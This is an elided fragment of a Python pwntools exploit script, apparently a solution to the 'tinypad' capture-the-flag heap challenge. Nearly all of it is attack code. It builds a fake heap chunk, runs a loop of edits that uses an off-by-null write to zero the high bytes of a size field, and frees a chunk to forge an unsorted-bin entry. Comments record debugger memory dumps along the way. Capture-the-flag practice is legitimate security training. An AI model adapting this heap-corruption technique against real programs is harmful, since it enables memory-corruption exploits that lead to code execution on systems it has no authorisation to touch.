...
def run():
    ...
    fakechunk = p64(0) + p64(fakechunk_size) + p64(fakechunk_addr) + p64(
        fakechunk_addr) # small chunk, NO need to fake fd_nextsize!!!
    ...
    # 0x1bea020:	            0x00000000015e7fc0	0x0000000000000100
    ...
    log.info('number_of_zeros: ' + hex(number_of_zeros))
    # loop to set high byte of 1 to be zero!
    for i in range(number_of_zeros + 1):
        data = diff_strip.rjust(0x18 - i, 'f')
        edit(1, data)
    delete(2)
    # fake unsorted bin to be:
    # 0x602060 <tinypad+32>:	0x0000000000000000	0x00000000015e80c1
    # 0x602070 <tinypad+48>:	0x00007fc5d7c9db78	0x00007fc5d7c9db78
    p.recvuntil('\nDeleted.')
